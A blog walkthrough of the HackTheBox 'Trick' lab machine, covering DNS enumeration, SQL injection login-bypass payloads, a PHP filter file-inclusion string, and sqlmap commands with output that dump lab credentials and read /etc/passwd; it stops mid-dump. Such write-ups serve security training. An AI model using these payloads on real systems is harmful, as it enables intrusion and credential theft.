<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Trick" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine begins w/ DNS enumeration, revealing a subdomain preprod-payroll.trick.htb that running a recruitment management system via nginx. The recruitment management system is susceptible to SQLi authentication bypass, allowing us to use SQLMAP’s file-read functionality to read nginx’s sites-enabled configuration file revealing another subdomain preprod-marketing.trick.htb and users on the machine." /><meta property="og:description" content="Overview This machine begins w/ DNS enumeration, revealing a subdomain preprod-payroll.trick.htb that running a recruitment management system via nginx. The recruitment management system is susceptible to SQLi authentication bypass, allowing us to use SQLMAP’s file-read functionality to read nginx’s sites-enabled configuration file revealing another subdomain preprod-marketing.trick.htb and users on the machine." /><link rel="canonical" href="https://yufongg.github.io/posts/Trick/" /><meta property="og:url" content="https://yufongg.github.io/posts/Trick/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-31T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Trick" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-07-31T00:00:00+08:00","description":"Overview This machine begins w/ DNS enumeration, revealing a subdomain preprod-payroll.trick.htb that running a recruitment management system via nginx. The recruitment management system is susceptible to SQLi authentication bypass, allowing us to use SQLMAP’s file-read functionality to read nginx’s sites-enabled configuration file revealing another subdomain preprod-marketing.trick.htb and users on the machine.","headline":"HackTheBox - Trick","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Trick/"},"url":"https://yufongg.github.io/posts/Trick/"}</script><title>HackTheBox - Trick | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Trick</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220810022050.png" class="preview-img bg" alt="Preview Image" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Trick</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1659196800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-07-31 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2944 words"> <em>16 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine begins w/ DNS enumeration, revealing a subdomain preprod-payroll.trick.htb that running a recruitment management system via nginx. The recruitment management system is susceptible to SQLi authentication bypass, allowing us to use SQLMAP’s file-read functionality to read nginx’s sites-enabled configuration file revealing another subdomain preprod-marketing.trick.htb and users on the machine.</p><p>preprod-marketing.trick.htb is susceptible to local file inclusion allowing us to include michael’s SSH private key, obtaining our initial foothold.</p><p>On the system, linpeas revealed that there is a directory (/etc/fail2ban/action.d) that michael has write access to, pspy64 revealed that there is a cronjob that replaces fail2ban configuration to its original state every 3 minutes.</p><p>The directory that michael has write access to contains the ban action that fail2ban executes if a ban is triggered. We can change the ban action (/etc/fail2ban/action.d/ip-tables/multiport.conf) to a reverse shell before the cronjob executes (within 3 minutes) to obtain root.</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Trick<tr><td>IP<td>10.10.11.166<tr><td>Points<td>-<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://app.hackthebox.com/users/184611">Geiseric</a><tr><td>Release Date<td>19-Jun-2022</table></div><h1 id="recon">Recon</h1><h2 id="tcp25-smtp">TCP/25 (SMTP) <a href="#tcp25-smtp" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="vrfy">VRFY <a href="#vrfy" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-22 23:27:30
[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task
[DATA] attacking smtp-enum://10.10.11.166:25/vrfy
[25][smtp-enum] host: 10.10.11.166   login: root
[25][smtp-enum] host: 10.10.11.166   login: mysql
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-22 23:27:52

</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">mysql</code><ul><li>It suggests that there is a MySQL database</ul></ul><h2 id="tcpudp53-dns">TCP/UDP/53 (DNS) <a href="#tcpudp53-dns" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="dns-reverse-lookup">DNS Reverse Lookup <a href="#dns-reverse-lookup" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>To find out domain name associated with given IP address<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>  ┌──(root💀kali)-[~/htb/trick]
  └─# dig -p 53 -x 10.10.11.166 @10.10.11.166
	
  ; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; -p 53 -x 10.10.11.166 @10.10.11.166
  ;; global options: +cmd
  ;; Got answer:
  ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 59238
  ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
  ;; WARNING: recursion requested but not available
	
  ;; OPT PSEUDOSECTION:
  ; EDNS: version: 0, flags:; udp: 4096
  ; COOKIE: 1c04a30ff97f1b56b14939d562dae355ed090e175dd1319d (good)
  ;; QUESTION SECTION:
  ;166.11.10.10.in-addr.arpa.	IN	PTR
	
  ;; ANSWER SECTION:
  166.11.10.10.in-addr.arpa. 604800 IN	PTR	trick.htb.
	
  ;; AUTHORITY SECTION:
  11.10.10.in-addr.arpa.	604800	IN	NS	trick.htb.
	
  ;; ADDITIONAL SECTION:
  trick.htb.		604800	IN	A	127.0.0.1
  trick.htb.		604800	IN	AAAA	::1
	
  ;; Query time: 44 msec
  ;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)
  ;; WHEN: Sat Jul 23 01:50:11 +08 2022
  ;; MSG SIZE  rcvd: 163
	
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">trick.htb</code></ul></ul><h3 id="ns-lookup">NS Lookup <a href="#ns-lookup" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>To find out nameserver as well<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>      ┌──(root💀kali)-[~/htb/trick/source_code]
      └─# nslookup
      SERVER 10.10.11.166
      Default server: 10.10.11.166
      Address: 10.10.11.166#53
      10.10.11.166
      166.11.10.10.in-addr.arpa	name = trick.htb.
</pre></table></code></div></div></ul><h3 id="zone-transfer">Zone Transfer <a href="#zone-transfer" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>To find out more subdomains<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>  ┌──(root💀kali)-[~/htb/trick]
  └─# dig AXFR -p 53 @10.10.11.166 trick.htb
	
  ; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; AXFR -p 53 @10.10.11.166 trick.htb
  ; (1 server found)
  ;; global options: +cmd
  trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
  trick.htb.		604800	IN	NS	trick.htb.
  trick.htb.		604800	IN	A	127.0.0.1
  trick.htb.		604800	IN	AAAA	::1
  preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
  trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
  ;; Query time: 48 msec
  ;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
  ;; WHEN: Sat Jul 23 01:53:52 +08 2022
  ;; XFR size: 6 records (messages 1, bytes 231)
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">preprod-payroll.trick.htb</code><li>Add it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></ul></ul><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ffuf">FFUF <a href="#ffuf" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>301      GET        7l       12w      185c http://10.10.11.166/assets =&gt; http://10.10.11.166/assets/
301      GET        7l       12w      185c http://10.10.11.166/css =&gt; http://10.10.11.166/css/
200      GET       83l      475w     5480c http://10.10.11.166/index.html
301      GET        7l       12w      185c http://10.10.11.166/js =&gt; http://10.10.11.166/js/
</pre></table></code></div></div><h1 id="initial-foothold">Initial Foothold</h1><h2 id="sqli-auth-bypass">SQLi Auth Bypass <a href="#sqli-auth-bypass" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Visited fuzzed directories (<code class="language-plaintext highlighter-rouge">http://10.10.11.166/FUZZ</code>), could not find any relevant information<li>FUZZ <code class="language-plaintext highlighter-rouge">preprod-payroll.trick.htb</code><li>Visit <code class="language-plaintext highlighter-rouge">preprod-payroll.trick.htb</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/trick]
 └─# ffuf -u http://preprod-payroll.trick.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt 
	
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
          \ \_\   \ \_\  \ \____/  \ \_\       
           \/_/    \/_/   \/___/    \/_/       
	
        v1.3.1 Kali Exclusive &lt;3
 ________________________________________________
	
  :: Method           : GET
  :: URL              : http://preprod-payroll.trick.htb/FUZZ
  :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
  :: Threads          : 40
  :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 ________________________________________________
	
                         [Status: 302, Size: 9546, Words: 1453, Lines: 267]
 assets                  [Status: 301, Size: 185, Words: 6, Lines: 8]
 database                [Status: 301, Size: 185, Words: 6, Lines: 8]
 index.php               [Status: 302, Size: 9546, Words: 1453, Lines: 267]
 :: Progress: [4615/4615] :: Job [1/1] :: 1127 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
	
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">database</code><ul><li>Suggests that there is a database that could be used for login.</ul></ul><li>Proceed to <code class="language-plaintext highlighter-rouge">preprod-payroll.trick.htb</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220723040033.png" alt="" data-proofer-ignore><li>Attempt SQLi, could not trigger an error w/ <code class="language-plaintext highlighter-rouge">'</code> quotes <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220723040619.png" alt="" data-proofer-ignore><li>Attempt SQLi Auth Bypass<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> # Payloads
 or 1=1
 or 1=1--
 or 1=1#
 or 1=1/*
 or 1=1 -- -
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220723042954.png" alt="" data-proofer-ignore><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220723043039.png" alt="" data-proofer-ignore></p></ol><h2 id="lfi-vulnerability---1">LFI Vulnerability - 1 <a href="#lfi-vulnerability---1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>After browsing through the Recruitment Management System, found a parameter that is vulnerable to LFI<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> preprod-payroll.trick.htb/index.php?page=&lt;Include a file w/ a php extension&gt;
</pre></table></code></div></div><li>Include files that could contain sensitive information w/ <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#php-filter">phpfilter</a>, it allows us to encode the page w/ base64 to later decode and view the contents<ul><li><code class="language-plaintext highlighter-rouge">index.php</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>  index.php?page=php://filter/convert.base64-encode/resource=index
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220726223151.png" alt="" data-proofer-ignore><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220726223529.png" alt="" data-proofer-ignore></p><ul><li>Check if GET parameter <code class="language-plaintext highlighter-rouge">$page</code> is set, then include that page, appending <code class="language-plaintext highlighter-rouge">.php</code> to it</ul><li><code class="language-plaintext highlighter-rouge">ajax.php</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220726223940.png" alt="" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">admin_class.php</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220726224021.png" alt="" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">db_connect.php</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220726224052.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">remo:TrulyImpossiblePasswordLmao123</code></ul></ul><li>Tried to SSH w/ <code class="language-plaintext highlighter-rouge">remo:TrulyImpossiblePasswordLmao123</code>, failed</ol><h2 id="sqli-database-enumeration">SQLi Database Enumeration <a href="#sqli-database-enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Instead of bypassing login, enumerate the database<li>Login and intercept w/ burp, save request as <code class="language-plaintext highlighter-rouge">sqli.txt</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220727044858.png" alt="" data-proofer-ignore><li>Enumerate databases<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
 └─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap -p username --dbs
	
 available databases [2]:
 [*] information_schema
 [*] payroll_db
	
</pre></table></code></div></div><li>Enumerate tables in database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
 └─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap -p username -D payroll_db --tables
	
 Database: payroll_db
 [11 tables]
 +---------------------+
 | position            |
 | allowances          |
 | attendance          |
 | deductions          |
 | department          |
 | employee            |
 | employee_allowances |
 | employee_deductions |
 | payroll             |
 | payroll_items       |
 | users               |
 +---------------------+
</pre></table></code></div></div><li>Enumerate value in <code class="language-plaintext highlighter-rouge">users</code> table from <code class="language-plaintext highlighter-rouge">payroll_db</code> database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
 └─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap -p username -D payroll_db -T users --dump
	
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220726234547.png" alt="" data-proofer-ignore></p><ul><li><code class="language-plaintext highlighter-rouge">Enemigosss:SuperGucciRainbowCake</code></ul><li>Failed to SSH w/ <code class="language-plaintext highlighter-rouge">Enemigosss:SuperGucciRainbowCake</code><li>Check current user<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
 └─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap --users
	
 database management system users [1]:
 [*] 'remo'@'localhost'
	
</pre></table></code></div></div><li>Check current user SQL privileges<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
 └─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap  --privilege --batch
	
 database management system users privileges:
 [*] %remo% [1]:
     privilege: FILE
	
</pre></table></code></div></div><ul><li>With <code class="language-plaintext highlighter-rouge">FILE</code> privilege,<ul><li>Able to read files we have read access to.<li>Able to write file to directories we have write access to</ul></ul><li>Read <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to view users in the machine<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
 └─# sqlmap -r sqli2.txt --output-dir=$(pwd)/sqlmap2  --file-read=/etc/passwd --batch --threads 10
	
 Parameter: username (POST)
 Type: time-based blind
 Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
 Payload: username=test' AND (SELECT 6658 FROM (SELECT(SLEEP(5)))InNy) AND 'ksPl'='ksPl&amp;password=test
	
	
 [*] starting @ 01:06:43 /2022-07-27/
	
 [*] ending @ 04:36:07 /2022-07-27/
	
 ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
 └─# cat /root/htb/trick/10.10.11.166/exploit/sqlmap2/preprod-payroll.trick.htb/files/_etc_passwd
 root:$6$78I.phJC$4eZRbAn.9IgixOBB5tlJAMVm90Qwv9T95w0rJIacRGZxTIvZ82JvR4G5pt99gxTly9H8Ryw35MSk5YjXG.XcJ0:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 www-�ata:x:33:33:www-data:/var/www:/usr/sbin/nologin
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
 systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
 systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
 messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
 tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
 dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
